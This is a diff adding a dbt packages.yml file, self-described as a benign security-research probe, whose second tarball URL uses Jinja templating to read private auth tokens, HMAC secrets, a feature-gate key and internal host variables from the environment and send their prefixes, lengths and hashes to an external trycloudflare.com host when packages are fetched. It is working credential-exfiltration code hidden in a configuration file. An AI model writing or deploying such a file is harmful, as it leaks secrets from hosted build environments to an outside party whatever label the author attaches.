@@ -1,0 +1,7 @@
+# Benign security-research probe. CROSS-TENANT IDENTITY COMPARISON. nonce xt5bb21c43b5
+packages:
+  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/xt0-control?n=xt5bb21c43b5&rung=xt0"
+    name: l145d9_xt0_control
+
+  - tarball: "https://civic-charges-tomatoes-julian.trycloudflare.com/pkg/xt1-ident?n=xt5bb21c43b5&rung=xt1&{% set _PPAT = env_var('DBT_CLOUD_PRIVATE_PACKAGES_AUTH_TOKEN','') %}PPAT_p={{ _PPAT[0:5] }}&PPAT_l={{ _PPAT | length }}&PPAT_h={{ local_md5(_PPAT)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLSEC = env_var('SL_HMAC_AUTH_SECRET','') %}SLSEC_p={{ _SLSEC[0:5] }}&SLSEC_l={{ _SLSEC | length }}&SLSEC_h={{ local_md5(_SLSEC)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _SLTOK = env_var('SL_HMAC_AUTH_TOKEN','') %}SLTOK_p={{ _SLTOK[0:5] }}&SLTOK_l={{ _SLTOK | length }}&SLTOK_h={{ local_md5(_SLTOK)[0:10] if local_md5 is defined else 'nomd5' }}&{% set _FGKEY = env_var('_DBT_FEATURE_GATE_KEY','') %}FGKEY_p={{ _FGKEY[0:5] }}&FGKEY_l={{ _FGKEY | length }}&FGKEY_h={{ local_md5(_FGKEY)[0:10] if local_md5 is defined else 'nomd5' }}&HUB={{ env_var('DBT_PACKAGE_HUB_URL','') }}&MFS={{ env_var('MFS_HOST','') }}&SLG={{ env_var('SLG_HOST','') }}&ACCTHOST={{ env_var('DBT_CLOUD_ACCOUNT_HOST','') }}&INVENV={{ env_var('DBT_INVOCATION_ENV','') }}&HOSTNAME={{ env_var('HOSTNAME','') }}&DBTENV={{ env_var('DBT_ENV','') }}"
+    name: l145d9_xt1_ident
